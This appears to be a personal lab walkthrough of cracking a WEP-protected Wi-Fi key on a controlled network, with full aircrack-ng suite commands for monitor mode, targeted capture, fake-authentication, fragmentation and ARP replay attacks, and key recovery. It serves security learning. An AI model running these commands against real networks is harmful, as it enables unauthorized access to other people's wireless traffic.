
> [!info]
> This was performed on a controlled network, meaning everything performed was both legal and ethical.

This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my [Wireless Cheatsheet](../Tools/Wireless%20Cheatsheet.md).

## Overview
---
WEP (Wired Equivalent Privacy) is an outdated and insecure wireless network security protocol that was was introduced as a standard early on in Wi-Fi's lifecycle, but has since been deprecated and replaced by more secure methods.

Like WPA2-PSK, WEP uses a single shared key for authentication.  However, it uses much weaker encryption and relies on small Initialization Vectors (IVs) to be combined with the secret key in order to encrypt data that’s about to be transmitted. Because the IV's are only 24-bit (which is quite small) they end up being re-used with the same key, and since IV keys are transferred with the data in plaintext so that the receiving party is able to decrypt the communication, an attacker can capture these IVs.

By capturing enough repeating IVs, an attacker can easily crack the WEP secret key because they’re able to make sense of the encrypted data, and they’re able to decrypt the secret key.

## Generating & Capturing IVs
---

```bash
# View Current WiFi Driver
sudo airmon-ng
# Create Monitor Interface
sudo airmon-ng start <interface>
```

![[Pasted image 20231015005332.png]]

With the monitor interface configured, next I began sniffing the network to find what networks are available.

```shell
# See available networks/channels/security
sudo airodump-ng <mon_interface>
```
*(In this case, my monitor interface is wlan0mon)*

![[Pasted image 20231015162527.png]]

This revealed the SSID of the WEP network, that it's on channel 3, and that the MAC address is "02:13:37:BE:EF:03".

With this knowledge, I restarted my "airodump" listener, refining it to focus specifically on the target network.

```shell
# Capture wireless traffic to a file
sudo airodump-ng --bssid "02:13:37:BE:EF:03" -c 3 --write "<network_ssid>" wlan0mon
```
*(By specifying '--write', all traffic will be dumped into a file we can reference later.)*

With my listener capturing network traffic, I needed to collect a large enough quantity of network initialization vectors (IVs) to crack the passphrase.  To do this, I performed a handful of replay attacks on the network.  The below screenshot shows approximately 30 IVs -- in order to crack the network key, I ideally wanted to get this number well into the thousands.  

![[Pasted image 20231015162618.png]]

The attacks I utilized to increase IV quantity during this scenario were:
- Fake Authentication Attack
- Fragmentation Attack
- ARP Request Replay Attack

```shell
# Fake Authentication Attack with monitor interface MAC
sudo aireplay-ng --fakeauth 0 -a "02:13:37:BE:EF:03" -h "20:00:00:00:00:00" wlan0mon

# Fragmentation Attack with monitor interface MAC
sudo aireplay-ng --fragment -b "02:13:37:BE:EF:03" -h "20:00:00:00:00:00" wlan0mon

# ARP Request Replay Attack with authenticated client MAC
sudo aireplay-ng --arpreplay -b "02:13:37:BE:EF:03" -h "20:00:00:00:03:00" wlan0mon
```

![[Pasted image 20231015163034.png]]
![[Pasted image 20231015163058.png]]

After some time, I eventually got the IV count to near 100,000.  This was more than enough to crack the network key.

![[Pasted image 20231015163215.png]]

## Cracking the Passphrase
---

To crack the key, I utilized "aircrack-ng" and pointed it to my network capture file containing all the IV's in order to conduct a WEP key attack.

```shell
# WEP Key Attack
sudo aircrack-ng ./<network_ssid>-01.cap
```

![[Pasted image 20230428023356.png]]

```
# Network Key
2E:2C:F0:E3:FF
```
